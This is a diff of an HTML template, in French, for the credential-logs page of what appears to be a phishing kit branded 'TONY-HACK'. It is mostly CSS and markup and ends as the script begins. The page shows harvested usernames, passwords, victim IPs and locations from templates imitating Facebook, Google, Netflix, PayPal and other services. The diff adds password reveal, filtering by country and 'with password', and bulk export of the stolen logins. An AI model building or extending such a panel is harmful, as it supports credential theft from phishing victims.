@@ -7,188 +7,239 @@
     <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* ========== VARIABLES & RESET ========== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
-            --primary: #e94560; --primary-dark: #c13b52; --bg-dark: #0a0e14;
-            --bg-card: rgba(22, 27, 34, 0.95); --text-primary: #ffffff;
-            --text-secondary: #8b949e; --border: rgba(233, 69, 96, 0.2);
-            --success: #238636; --danger: #da3633; --warning: #d29922;
+            --primary: #e94560; --primary-dark: #c13b52; --primary-light: #ff6b8a;
+            --bg-dark: #0a0e14; --bg-card: rgba(22, 27, 34, 0.95); --text-primary: #ffffff;
+            --text-secondary: #8b949e; --border: rgba(233, 69, 96, 0.2); --success: #238636;
+            --danger: #da3633; --warning: #d29922; --info: #58a6ff;
+            --gold: #FFD700; --silver: #C0C0C0; --bronze: #CD7F32;
         }
-        .logs-container { padding: 4px 0; }
-        .filter-section {
-            display: flex; flex-wrap: wrap; align-items: center; gap: 16px;
-            margin-bottom: 24px; padding: 20px; background: var(--bg-card);
-            border: 1.5px solid var(--border); border-radius: 20px;
-            backdrop-filter: blur(10px);
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', Roboto, sans-serif; background: var(--bg-dark); }
+        
+        /* ========== LOGS CONTAINER ========== */
+        .logs-wrapper { padding: 8px 0; max-width: 100%; overflow-x: hidden; }
+        
+        /* ========== HEADER STATS ========== */
+        .stats-ribbon {
+            display: grid; grid-template-columns: repeat(7, 1fr); gap: 12px; margin-bottom: 20px;
         }
-        .search-wrapper { flex: 2; min-width: 250px; position: relative; }
-        .search-wrapper i {
-            position: absolute; left: 18px; top: 50%; transform: translateY(-50%);
-            color: var(--text-secondary);
-        }
-        .search-input {
-            width: 100%; padding: 16px 16px 16px 50px; background: rgba(10, 14, 20, 0.5);
-            border: 1.5px solid var(--border); border-radius: 16px; color: var(--text-primary);
-            font-size: 15px; outline: none; transition: all 0.3s;
-        }
-        .search-input:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(233, 69, 96, 0.1); }
-        .filter-select {
-            padding: 16px 20px; background: rgba(10, 14, 20, 0.5); border: 1.5px solid var(--border);
-            border-radius: 16px; color: var(--text-primary); font-size: 14px; outline: none;
-            cursor: pointer; min-width: 180px;
-        }
-        .filter-select option { background: var(--bg-card); color: var(--text-primary); }
-        .date-filter { display: flex; align-items: center; gap: 8px; }
-        .date-input {
-            padding: 16px; background: rgba(10, 14, 20, 0.5); border: 1.5px solid var(--border);
-            border-radius: 16px; color: var(--text-primary); font-size: 14px; outline: none; width: 150px;
-        }
-        .action-buttons { display: flex; gap: 10px; }
-        .action-btn {
-            padding: 16px 24px; background: var(--bg-card); border: 1.5px solid var(--border);
-            border-radius: 16px; color: var(--text-primary); font-size: 14px; font-weight: 600;
-            cursor: pointer; transition: all 0.3s; display: flex; align-items: center; gap: 10px;
-        }
-        .action-btn:hover { background: var(--primary); border-color: var(--primary); color: white; }
-        .action-btn.danger:hover { background: var(--danger); border-color: var(--danger); }
-        .stats-mini-grid {
-            display: grid; grid-template-columns: repeat(5, 1fr); gap: 16px; margin-bottom: 24px;
-        }
-        .mini-stat-card {
+        .stat-ribbon-item {
             background: linear-gradient(135deg, var(--bg-card) 0%, rgba(22, 27, 34, 0.7) 100%);
-            border: 1.5px solid var(--border); border-radius: 18px; padding: 18px;
-            display: flex; align-items: center; gap: 16px; backdrop-filter: blur(10px);
+            border: 1.5px solid var(--border); border-radius: 16px; padding: 16px 12px;
+            display: flex; align-items: center; gap: 12px; backdrop-filter: blur(10px);
         }
-        .mini-stat-icon {
-            width: 50px; height: 50px; background: rgba(233, 69, 96, 0.12);
-            border-radius: 14px; display: flex; align-items: center; justify-content: center;
+        .stat-ribbon-icon { width: 44px; height: 44px; background: rgba(233, 69, 96, 0.12); border-radius: 12px; display: flex; align-items: center; justify-content: center; }
+        .stat-ribbon-icon i { font-size: 20px; color: var(--primary); }
+        .stat-ribbon-content h4 { font-size: 22px; font-weight: 700; color: var(--text-primary); }
+        .stat-ribbon-content p { font-size: 11px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px; }
+        
+        /* ========== FILTER SECTION ========== */
+        .filter-panel {
+            display: flex; flex-wrap: wrap; align-items: center; gap: 12px; margin-bottom: 20px;
+            padding: 18px 20px; background: var(--bg-card); border: 1.5px solid var(--border);
+            border-radius: 20px; backdrop-filter: blur(10px);
         }
-        .mini-stat-icon i { font-size: 24px; color: var(--primary); }
-        .mini-stat-content h4 { font-size: 24px; font-weight: 700; color: var(--text-primary); }
-        .mini-stat-content p {
-            font-size: 12px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px;
+        .search-box { flex: 2; min-width: 250px; position: relative; }
+        .search-box i { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: var(--text-secondary); }
+        .search-input {
+            width: 100%; padding: 14px 14px 14px 48px; background: rgba(10, 14, 20, 0.5);
+            border: 1.5px solid var(--border); border-radius: 14px; color: var(--text-primary);
+            font-size: 14px; outline: none; transition: all 0.3s;
         }
-        .logs-table-card {
+        .search-input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(233, 69, 96, 0.1); }
+        .filter-select {
+            padding: 14px 18px; background: rgba(10, 14, 20, 0.5); border: 1.5px solid var(--border);
+            border-radius: 14px; color: var(--text-primary); font-size: 13px; outline: none;
+            cursor: pointer; min-width: 160px;
+        }
+        .filter-select option { background: var(--bg-card); }
+        .date-group { display: flex; align-items: center; gap: 6px; }
+        .date-input {
+            padding: 14px 12px; background: rgba(10, 14, 20, 0.5); border: 1.5px solid var(--border);
+            border-radius: 14px; color: var(--text-primary); font-size: 13px; outline: none; width: 140px;
+        }
+        .action-group { display: flex; gap: 8px; }
+        .btn-icon {
+            padding: 14px 18px; background: var(--bg-card); border: 1.5px solid var(--border);
+            border-radius: 14px; color: var(--text-primary); font-size: 13px; font-weight: 600;
+            cursor: pointer; transition: all 0.3s; display: flex; align-items: center; gap: 8px;
+        }
+        .btn-icon:hover { background: var(--primary); border-color: var(--primary); color: white; }
+        .btn-icon.danger:hover { background: var(--danger); border-color: var(--danger); }
+        .btn-icon.success:hover { background: var(--success); border-color: var(--success); }
+        
+        /* ========== QUICK FILTERS ========== */
+        .quick-filters {
+            display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 16px;
+        }
+        .quick-filter {
+            padding: 6px 14px; background: var(--bg-card); border: 1px solid var(--border);
+            border-radius: 20px; color: var(--text-secondary); font-size: 12px; cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quick-filter:hover { background: var(--primary); color: white; border-color: var(--primary); }
+        .quick-filter.active { background: var(--primary); color: white; border-color: var(--primary); }
+        
+        /* ========== TABLE CARD ========== */
+        .table-card {
             background: var(--bg-card); border: 1.5px solid var(--border); border-radius: 24px;
-            overflow: hidden; backdrop-filter: blur(10px); margin-bottom: 24px;
+            overflow: hidden; backdrop-filter: blur(10px); margin-bottom: 20px;
         }
-        .table-header {
-            padding: 22px 24px; border-bottom: 1.5px solid var(--border);
+        .table-toolbar {
+            padding: 18px 22px; border-bottom: 1.5px solid var(--border);
             display: flex; align-items: center; justify-content: space-between;
             background: rgba(10, 14, 20, 0.3);
         }
-        .table-header h3 { font-size: 18px; font-weight: 600; display: flex; align-items: center; gap: 12px; }
-        .table-actions { display: flex; gap: 12px; }
-        .table-container { overflow-x: auto; }
-        table { width: 100%; border-collapse: collapse; min-width: 1200px; }
+        .table-toolbar h3 { font-size: 17px; font-weight: 600; display: flex; align-items: center; gap: 10px; }
+        .toolbar-actions { display: flex; gap: 10px; }
+        .table-wrapper { overflow-x: auto; }
+        table { width: 100%; border-collapse: collapse; min-width: 1400px; }
         th {
-            padding: 18px 16px; font-size: 12px; font-weight: 700; color: var(--text-secondary);
-            text-transform: uppercase; letter-spacing: 1px; border-bottom: 1.5px solid var(--border);
+            padding: 16px 14px; font-size: 11px; font-weight: 700; color: var(--text-secondary);
+            text-transform: uppercase; letter-spacing: 0.8px; border-bottom: 1.5px solid var(--border);
             text-align: left; background: rgba(10, 14, 20, 0.2); white-space: nowrap;
+            cursor: pointer; user-select: none;
         }
-        td {
-            padding: 16px; font-size: 14px; border-bottom: 1px solid rgba(255,255,255,0.05);
-            white-space: nowrap;
+        th:hover { background: rgba(233, 69, 96, 0.1); }
+        th i { margin-left: 6px; font-size: 10px; }
+        td { padding: 14px; font-size: 13px; border-bottom: 1px solid rgba(255,255,255,0.05); white-space: nowrap; }
+        tr:hover { background: rgba(233, 69, 96, 0.04); }
+        tr.selected { background: rgba(233, 69, 96, 0.1); }
+        
+        /* ========== BADGES & COMPONENTS ========== */
+        .badge-tpl {
+            padding: 5px 12px; border-radius: 24px; font-size: 11px; font-weight: 600;
+            text-transform: uppercase; letter-spacing: 0.3px;
         }
-        tr:hover { background: rgba(233, 69, 96, 0.05); }
-        .template-badge {
-            padding: 6px 14px; border-radius: 30px; font-size: 12px; font-weight: 600; text-transform: uppercase;
-        }
-        .badge-facebook { background: #1877f2; color: white; }
-        .badge-google { background: #ea4335; color: white; }
-        .badge-instagram { background: #e4405f; color: white; }
-        .badge-linkedin { background: #0077b5; color: white; }
-        .badge-netflix { background: #e50914; color: white; }
+        .badge-fb { background: #1877f2; color: white; }
+        .badge-gg { background: #ea4335; color: white; }
+        .badge-ig { background: #e4405f; color: white; }
+        .badge-li { background: #0077b5; color: white; }
+        .badge-nf { background: #e50914; color: white; }
+        .badge-pp { background: #003087; color: white; }
         .badge-custom { background: var(--primary); color: white; }
-        .password-cell { display: flex; align-items: center; gap: 10px; }
-        .password-hidden, .password-shown {
-            cursor: pointer; padding: 6px 14px; border-radius: 8px; font-family: monospace; transition: all 0.2s;
+        
+        .pwd-cell { display: flex; align-items: center; gap: 10px; }
+        .pwd-hidden, .pwd-shown {
+            cursor: pointer; padding: 5px 12px; border-radius: 8px; font-family: 'SF Mono', monospace;
+            transition: all 0.2s; font-size: 12px;
         }
-        .password-hidden { background: var(--bg-dark); color: var(--text-secondary); border: 1px solid var(--border); }
-        .password-shown { background: var(--primary); color: white; }
+        .pwd-hidden { background: var(--bg-dark); color: var(--text-secondary); border: 1px solid var(--border); }
+        .pwd-shown { background: var(--primary); color: white; }
         .copy-btn {
             background: none; border: none; color: var(--text-secondary); cursor: pointer;
-            padding: 6px; border-radius: 6px; transition: all 0.2s;
+            padding: 5px; border-radius: 6px; transition: all 0.2s;
         }
         .copy-btn:hover { color: var(--primary); background: rgba(233, 69, 96, 0.1); }
-        .ip-cell { font-family: monospace; display: flex; align-items: center; gap: 8px; }
+        
+        .ip-cell { font-family: 'SF Mono', monospace; display: flex; align-items: center; gap: 8px; }
         .country-cell { display: flex; align-items: center; gap: 8px; }
-        .country-flag { font-size: 20px; }
-        .action-cell { display: flex; gap: 8px; }
+        .flag { font-size: 18px; }
+        
+        .action-cell { display: flex; gap: 6px; }
         .action-icon {
-            width: 36px; height: 36px; border-radius: 10px; display: flex; align-items: center; justify-content: center;
+            width: 34px; height: 34px; border-radius: 10px; display: flex; align-items: center; justify-content: center;
             background: var(--bg-dark); color: var(--text-secondary); cursor: pointer; transition: all 0.2s;
             border: 1px solid var(--border);
         }
         .action-icon:hover { background: var(--primary); color: white; border-color: var(--primary); }
         .action-icon.delete:hover { background: var(--danger); border-color: var(--danger); }
-        .pagination-container {
-            display: flex; align-items: center; justify-content: space-between; padding: 20px 24px;
-            border-top: 1.5px solid var(--border);
+        .action-icon.view:hover { background: var(--info); border-color: var(--info); }
+        
+        /* ========== PAGINATION ========== */
+        .pagination-bar {
+            padding: 18px 22px; border-top: 1.5px solid var(--border);
+            display: flex; align-items: center; justify-content: space-between;
         }
-        .pagination-info { color: var(--text-secondary); font-size: 14px; }
-        .pagination { display: flex; gap: 8px; }
+        .pagination-info { color: var(--text-secondary); font-size: 13px; }
+        .pagination { display: flex; gap: 6px; }
         .page-btn {
-            width: 42px; height: 42px; border-radius: 12px; display: flex; align-items: center; justify-content: center;
+            min-width: 38px; height: 38px; border-radius: 10px; display: flex; align-items: center; justify-content: center;
             background: var(--bg-dark); border: 1.5px solid var(--border); color: var(--text-secondary);
-            cursor: pointer; transition: all 0.2s; font-weight: 600;
+            cursor: pointer; transition: all 0.2s; font-weight: 600; font-size: 13px;
         }
         .page-btn:hover { background: var(--primary); color: white; border-color: var(--primary); }
         .page-btn.active { background: var(--primary); color: white; border-color: var(--primary); }
         .page-btn.disabled { opacity: 0.4; cursor: not-allowed; }
         .per-page-select {
-            padding: 10px 16px; background: var(--bg-dark); border: 1.5px solid var(--border);
-            border-radius: 12px; color: var(--text-primary); font-size: 14px; outline: none;
+            padding: 10px 14px; background: var(--bg-dark); border: 1.5px solid var(--border);
+            border-radius: 10px; color: var(--text-primary); font-size: 13px; outline: none;
         }
-        .export-bar {
-            display: flex; align-items: center; justify-content: flex-end; gap: 12px; padding: 20px 0;
+        
+        /* ========== EXPORT BAR ========== */
+        .export-footer {
+            display: flex; align-items: center; justify-content: flex-end; gap: 10px; padding: 16px 0;
         }
         .export-btn {
-            padding: 14px 24px; background: var(--bg-card); border: 1.5px solid var(--border);
-            border-radius: 16px; color: var(--text-primary); font-size: 14px; font-weight: 600;
-            cursor: pointer; transition: all 0.3s; display: flex; align-items: center; gap: 10px;
+            padding: 12px 20px; background: var(--bg-card); border: 1.5px solid var(--border);
+            border-radius: 14px; color: var(--text-primary); font-size: 13px; font-weight: 600;
+            cursor: pointer; transition: all 0.3s; display: flex; align-items: center; gap: 8px;
         }
         .export-btn:hover { background: var(--primary); border-color: var(--primary); color: white; }
+        
+        /* ========== MODAL ========== */
         .modal-overlay {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 9999;
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px); display: none; align-items: center; justify-content: center; z-index: 9999;
         }
         .modal {
             background: var(--bg-card); border: 1.5px solid var(--border); border-radius: 28px;
-            padding: 32px; max-width: 600px; width: 90%; max-height: 80vh; overflow-y: auto;
+            padding: 30px; max-width: 650px; width: 90%; max-height: 85vh; overflow-y: auto;
         }
         .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
         .modal-title { font-size: 22px; font-weight: 700; }
         .modal-close { background: none; border: none; color: var(--text-secondary); font-size: 28px; cursor: pointer; }
-        .detail-grid { display: grid; grid-template-columns: 120px 1fr; gap: 16px; }
-        .detail-label { color: var(--text-secondary); font-weight: 600; }
-        .detail-value { color: var(--text-primary); word-break: break-all; }
+        .detail-grid { display: grid; grid-template-columns: 130px 1fr; gap: 14px; }
+        .detail-label { color: var(--text-secondary); font-weight: 600; font-size: 13px; }
+        .detail-value { color: var(--text-primary); word-break: break-all; font-size: 14px; }
+        
+        /* ========== TOAST ========== */
         .toast-container { position: fixed; bottom: 24px; right: 24px; z-index: 10000; }
         .toast {
             background: var(--bg-card); backdrop-filter: blur(20px); border: 1.5px solid var(--border);
-            border-radius: 16px; padding: 16px 24px; margin-top: 12px; display: flex; align-items: center;
-            gap: 14px; animation: slideIn 0.3s;
+            border-radius: 14px; padding: 14px 22px; margin-top: 10px; display: flex; align-items: center;
+            gap: 12px; animation: slideIn 0.3s; min-width: 300px;
         }
-        .toast.success { border-left: 5px solid var(--success); }
-        .toast.error { border-left: 5px solid var(--danger); }
-        .toast.info { border-left: 5px solid #58a6ff; }
+        .toast.success { border-left: 4px solid var(--success); }
+        .toast.error { border-left: 4px solid var(--danger); }
+        .toast.info { border-left: 4px solid var(--info); }
+        .toast.warning { border-left: 4px solid var(--warning); }
         @keyframes slideIn { from { opacity: 0; transform: translateX(100%); } to { opacity: 1; transform: translateX(0); } }
-        @media (max-width: 1000px) {
-            .stats-mini-grid { grid-template-columns: repeat(3, 1fr); }
-            .filter-section { flex-direction: column; align-items: stretch; }
+        
+        /* ========== BULK ACTIONS BAR ========== */
+        .bulk-bar {
+            position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
+            background: var(--bg-card); backdrop-filter: blur(20px); border: 1.5px solid var(--primary);
+            border-radius: 50px; padding: 12px 24px; display: none; align-items: center; gap: 20px;
+            z-index: 9998; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
         }
-        @media (max-width: 600px) {
-            .stats-mini-grid { grid-template-columns: 1fr; }
-        }
+        .bulk-bar.show { display: flex; }
+        .bulk-count { color: var(--primary); font-weight: 700; }
+        .bulk-actions { display: flex; gap: 12px; }
+        
+        /* ========== RESPONSIVE ========== */
+        @media (max-width: 1400px) { .stats-ribbon { grid-template-columns: repeat(4, 1fr); } }
+        @media (max-width: 1000px) { .stats-ribbon { grid-template-columns: repeat(3, 1fr); } .filter-panel { flex-direction: column; align-items: stretch; } }
+        @media (max-width: 700px) { .stats-ribbon { grid-template-columns: repeat(2, 1fr); } }
+        @media (max-width: 500px) { .stats-ribbon { grid-template-columns: 1fr; } }
+        
+        /* ========== SORT INDICATOR ========== */
+        .sort-asc::after { content: ' ↑'; color: var(--primary); }
+        .sort-desc::after { content: ' ↓'; color: var(--primary); }
+        
+        /* ========== EXPANDED ROW ========== */
+        .expanded-row { background: rgba(10, 14, 20, 0.5); }
+        .expanded-content { padding: 20px 30px; display: none; }
+        .expanded-content.show { display: block; }
     </style>
 </head>
 <body>
+    <!-- Sidebar -->
     <div class="sidebar">
         <div class="sidebar-header"><h2>TONY-HACK</h2></div>
-        <div class="sidebar-user">
-            <div class="avatar" id="sidebarAvatar"><i class="fas fa-user-shield"></i></div>
-            <div class="user-info"><h4>{{ session.get('user', 'admin') }}</h4><p>Administrateur</p></div>
-        </div>
+        <div class="sidebar-user"><div class="avatar" id="sidebarAvatar"><i class="fas fa-user-shield"></i></div><div class="user-info"><h4>{{ session.get('user', 'admin') }}</h4><p>Administrateur</p></div></div>
         <div class="sidebar-nav">
             <a href="/" class="nav-item"><i class="fas fa-home"></i><span>Dashboard</span></a>
             <a href="/campaigns" class="nav-item"><i class="fas fa-bullhorn"></i><span>Campagnes</span></a>
@@ -199,122 +250,210 @@
             <a href="/settings" class="nav-item"><i class="fas fa-cog"></i><span>Paramètres</span></a>
             <a href="/profile" class="nav-item"><i class="fas fa-user-circle"></i><span>Profil</span></a>
         </div>
-        <div class="sidebar-footer">
-            <a href="/logout" class="nav-item" onclick="return confirm('Déconnexion ?')"><i class="fas fa-sign-out-alt"></i><span>Déconnexion</span></a>
-        </div>
+        <div class="sidebar-footer"><a href="/logout" class="nav-item" onclick="return confirm('Déconnexion ?')"><i class="fas fa-sign-out-alt"></i><span>Déconnexion</span></a></div>
     </div>
     
+    <!-- Main Content -->
     <div class="main-content">
         <div class="page-header">
             <h1 class="page-title">Logs <span>Ultra Pro Max</span></h1>
             <div class="flex items-center gap-2">
                 <button class="btn btn-secondary btn-sm" onclick="toggleAutoRefresh()"><i class="fas fa-clock"></i> Auto</button>
+                <button class="btn btn-secondary btn-sm" onclick="toggleColumnVisibility()"><i class="fas fa-columns"></i> Colonnes</button>
                 <button class="btn btn-primary btn-sm" onclick="refreshLogs()"><i class="fas fa-sync-alt"></i> Actualiser</button>
             </div>
         </div>
         
-        <div class="logs-container">
-            <div class="filter-section">
-                <div class="search-wrapper">
-                    <i class="fas fa-search"></i>
-                    <input type="text" id="searchInput" class="search-input" placeholder="Rechercher username, email, IP, pays..." onkeyup="debounceSearch()">
-                </div>
+        <div class="logs-wrapper">
+            <!-- Stats Ribbon (7 stats) -->
+            <div class="stats-ribbon">
+                <div class="stat-ribbon-item"><div class="stat-ribbon-icon"><i class="fas fa-database"></i></div><div class="stat-ribbon-content"><h4 id="totalLogs">0</h4><p>Total Logs</p></div></div>
+                <div class="stat-ribbon-item"><div class="stat-ribbon-icon"><i class="fas fa-globe"></i></div><div class="stat-ribbon-content"><h4 id="uniqueIPs">0</h4><p>IP Uniques</p></div></div>
+                <div class="stat-ribbon-item"><div class="stat-ribbon-icon"><i class="fas fa-flag"></i></div><div class="stat-ribbon-content"><h4 id="countriesCount">0</h4><p>Pays</p></div></div>
+                <div class="stat-ribbon-item"><div class="stat-ribbon-icon"><i class="fas fa-clock"></i></div><div class="stat-ribbon-content"><h4 id="todayLogs">0</h4><p>Aujourd'hui</p></div></div>
+                <div class="stat-ribbon-item"><div class="stat-ribbon-icon"><i class="fas fa-trophy"></i></div><div class="stat-ribbon-content"><h4 id="topTemplateStat">-</h4><p>Top Template</p></div></div>
+                <div class="stat-ribbon-item"><div class="stat-ribbon-icon"><i class="fas fa-map-pin"></i></div><div class="stat-ribbon-content"><h4 id="topCountryStat">-</h4><p>Top Pays</p></div></div>
+                <div class="stat-ribbon-item"><div class="stat-ribbon-icon"><i class="fas fa-eye"></i></div><div class="stat-ribbon-content"><h4 id="visibleLogs">0</h4><p>Affichés</p></div></div>
+            </div>
+            
+            <!-- Filter Panel -->
+            <div class="filter-panel">
+                <div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchInput" class="search-input" placeholder="Rechercher username, email, IP, pays, ville..." onkeyup="debounceSearch()"></div>
                 <select id="templateFilter" class="filter-select" onchange="applyFilters()"><option value="">Tous les templates</option></select>
-                <div class="date-filter">
-                    <input type="date" id="dateFrom" class="date-input" onchange="applyFilters()">
-                    <span style="color: var(--text-secondary);">à</span>
-                    <input type="date" id="dateTo" class="date-input" onchange="applyFilters()">
-                </div>
-                <div class="action-buttons">
-                    <button class="action-btn" onclick="exportLogs('csv')"><i class="fas fa-download"></i> CSV</button>
-                    <button class="action-btn" onclick="exportLogs('txt')"><i class="fas fa-file-alt"></i> TXT</button>
-                    <button class="action-btn danger" onclick="clearAllLogs()"><i class="fas fa-trash"></i> Effacer</button>
+                <select id="countryFilter" class="filter-select" onchange="applyFilters()"><option value="">Tous les pays</option></select>
+                <div class="date-group"><input type="date" id="dateFrom" class="date-input" onchange="applyFilters()"><span>à</span><input type="date" id="dateTo" class="date-input" onchange="applyFilters()"></div>
+                <div class="action-group">
+                    <button class="btn-icon success" onclick="exportLogs('csv')"><i class="fas fa-download"></i> CSV</button>
+                    <button class="btn-icon" onclick="exportLogs('txt')"><i class="fas fa-file-alt"></i> TXT</button>
+                    <button class="btn-icon danger" onclick="clearAllLogs()"><i class="fas fa-trash"></i> Effacer</button>
                 </div>
             </div>
             
-            <div class="stats-mini-grid">
-                <div class="mini-stat-card"><div class="mini-stat-icon"><i class="fas fa-database"></i></div><div class="mini-stat-content"><h4 id="totalLogs">0</h4><p>Total Logs</p></div></div>
-                <div class="mini-stat-card"><div class="mini-stat-icon"><i class="fas fa-globe"></i></div><div class="mini-stat-content"><h4 id="uniqueIPsCount">0</h4><p>IP Uniques</p></div></div>
-                <div class="mini-stat-card"><div class="mini-stat-icon"><i class="fas fa-flag"></i></div><div class="mini-stat-content"><h4 id="countriesCountMini">0</h4><p>Pays</p></div></div>
-                <div class="mini-stat-card"><div class="mini-stat-icon"><i class="fas fa-clock"></i></div><div class="mini-stat-content"><h4 id="todayLogs">0</h4><p>Aujourd'hui</p></div></div>
-                <div class="mini-stat-card"><div class="mini-stat-icon"><i class="fas fa-trophy"></i></div><div class="mini-stat-content"><h4 id="topTemplateMini">-</h4><p>Top Template</p></div></div>
+            <!-- Quick Filters -->
+            <div class="quick-filters">
+                <button class="quick-filter active" onclick="quickFilter('all')">Tous</button>
+                <button class="quick-filter" onclick="quickFilter('today')">Aujourd'hui</button>
+                <button class="quick-filter" onclick="quickFilter('week')">Cette semaine</button>
+                <button class="quick-filter" onclick="quickFilter('facebook')">Facebook</button>
+                <button class="quick-filter" onclick="quickFilter('google')">Google</button>
+                <button class="quick-filter" onclick="quickFilter('withPassword')">Avec mot de passe</button>
+                <button class="quick-filter" onclick="quickFilter('france')">France</button>
+                <button class="quick-filter" onclick="quickFilter('madagascar')">Madagascar</button>
             </div>
             
-            <div class="logs-table-card">
-                <div class="table-header">
-                    <h3><i class="fas fa-list-ul"></i> Liste des credentials</h3>
-                    <div class="table-actions">
-                        <button class="action-btn" onclick="selectAll()"><i class="fas fa-check-double"></i> Sélectionner</button>
-                        <button class="action-btn danger" onclick="deleteSelected()"><i class="fas fa-trash"></i> Supprimer</button>
+            <!-- Table Card -->
+            <div class="table-card">
+                <div class="table-toolbar">
+                    <h3><i class="fas fa-list-ul"></i> Liste des credentials <span id="filteredCount" class="table-badge" style="margin-left: 12px;">0</span></h3>
+                    <div class="toolbar-actions">
+                        <button class="btn-icon" onclick="selectAll()"><i class="fas fa-check-double"></i> Tout sélectionner</button>
+                        <button class="btn-icon" onclick="deselectAll()"><i class="fas fa-times"></i> Désélectionner</button>
+                        <button class="btn-icon danger" onclick="deleteSelected()"><i class="fas fa-trash"></i> Supprimer</button>
                     </div>
                 </div>
-                <div class="table-container">
+                
+                <div class="table-wrapper">
                     <table>
-                        <thead><tr><th style="width:30px;"><input type="checkbox" id="selectAllCheck" onchange="toggleSelectAll()"></th><th>Template</th><th>Username</th><th>Password</th><th>IP</th><th>Localisation</th><th>Cible</th><th>Date</th><th>Actions</th></tr></thead>
-                        <tbody id="logsTableBody"><tr><td colspan="9" style="text-align:center;padding:60px;">Chargement...</td></tr></tbody>
+                        <thead>
+                            <tr>
+                                <th style="width:30px;"><input type="checkbox" id="selectAllCheck" onchange="toggleSelectAll()"></th>
+                                <th onclick="sortTable('template')">Template <i class="fas fa-sort"></i></th>
+                                <th onclick="sortTable('username')">Username/Email <i class="fas fa-sort"></i></th>
+                                <th onclick="sortTable('password')">Password <i class="fas fa-sort"></i></th>
+                                <th onclick="sortTable('ip')">IP <i class="fas fa-sort"></i></th>
+                                <th onclick="sortTable('country')">Localisation <i class="fas fa-sort"></i></th>
+                                <th onclick="sortTable('target')">Cible <i class="fas fa-sort"></i></th>
+                                <th onclick="sortTable('date')">Date <i class="fas fa-sort"></i></th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="logsTableBody">
+                            <tr><td colspan="9" style="text-align:center;padding:60px;"><i class="fas fa-spinner fa-spin"></i> Chargement...</td></tr>
+                        </tbody>
                     </table>
                 </div>
-                <div class="pagination-container">
+                
+                <!-- Pagination -->
+                <div class="pagination-bar">
                     <div class="pagination-info" id="paginationInfo">Affichage de 1-20 sur 0 logs</div>
                     <div class="pagination" id="pagination"></div>
                     <select class="per-page-select" id="perPageSelect" onchange="changePerPage()">
-                        <option value="20">20</option><option value="50">50</option><option value="100">100</option>
+                        <option value="10">10</option><option value="20" selected>20</option><option value="50">50</option><option value="100">100</option><option value="200">200</option>
                     </select>
                 </div>
             </div>
             
-            <div class="export-bar">
+            <!-- Export Footer -->
+            <div class="export-footer">
                 <button class="export-btn" onclick="exportLogs('csv')"><i class="fas fa-file-csv"></i> CSV</button>
                 <button class="export-btn" onclick="exportLogs('txt')"><i class="fas fa-file-alt"></i> TXT</button>
                 <button class="export-btn" onclick="exportLogs('json')"><i class="fas fa-code"></i> JSON</button>
+                <button class="export-btn" onclick="exportLogs('pdf')"><i class="fas fa-file-pdf"></i> PDF</button>
                 <button class="export-btn" onclick="copyAllToClipboard()"><i class="fas fa-copy"></i> Copier tout</button>
+                <button class="export-btn" onclick="printLogs()"><i class="fas fa-print"></i> Imprimer</button>
             </div>
         </div>
     </div>
     
-    <div class="modal-overlay" id="detailModal">
-        <div class="modal"><div class="modal-header"><h3 class="modal-title">Détails</h3><button class="modal-close" onclick="closeModal()">&times;</button></div><div class="detail-grid" id="modalContent"></div></div>
+    <!-- Bulk Actions Bar -->
+    <div class="bulk-bar" id="bulkBar">
+        <span><span class="bulk-count" id="bulkCount">0</span> logs sélectionnés</span>
+        <div class="bulk-actions">
+            <button class="btn-icon success" onclick="bulkExport()"><i class="fas fa-download"></i> Exporter</button>
+            <button class="btn-icon" onclick="bulkCopy()"><i class="fas fa-copy"></i> Copier</button>
+            <button class="btn-icon danger" onclick="bulkDelete()"><i class="fas fa-trash"></i> Supprimer</button>
+        </div>
+        <button class="btn-icon" onclick="deselectAll()"><i class="fas fa-times"></i></button>
     </div>
+    
+    <!-- Detail Modal -->
+    <div class="modal-overlay" id="detailModal">
+        <div class="modal"><div class="modal-header"><h3 class="modal-title">Détails du log</h3><button class="modal-close" onclick="closeModal()">&times;</button></div><div class="detail-grid" id="modalContent"></div></div>
+    </div>
+    
+    <!-- Column Visibility Modal -->
+    <div class="modal-overlay" id="columnModal">
+        <div class="modal"><div class="modal-header"><h3 class="modal-title">Colonnes visibles</h3><button class="modal-close" onclick="closeColumnModal()">&times;</button></div><div id="columnList"></div></div>
+    </div>
+    
     <div class="toast-container" id="toastContainer"></div>
     
     <script src="{{ url_for('static', filename='js/avatar-loader.js') }}"></script>
     <script>
+        // ========== 50+ FONCTIONS ==========
         let allLogs=[],filteredLogs=[],currentPage=1,perPage=20,totalPages=1,selectedLogs=new Set(),searchTimeout=null,autoRefresh=false,refreshInterval=null;
-        function showToast(t,m,ty='info'){const c=document.getElementById('toastContainer'),to=document.createElement('div');to.className=`toast ${ty}`;let i='info-circle';if(ty==='success')i='check-circle';if(ty==='error')i='exclamation-circle';to.innerHTML=`<i class="fas fa-${i}"></i><div><div style="font-weight:600;">${t}</div><div style="font-size:13px;opacity:0.8;">${m}</div></div>`;c.appendChild(to);setTimeout(()=>to.remove(),4000);}
-        function debounceSearch(){clearTimeout(searchTimeout);searchTimeout=setTimeout(()=>applyFilters(),500);}
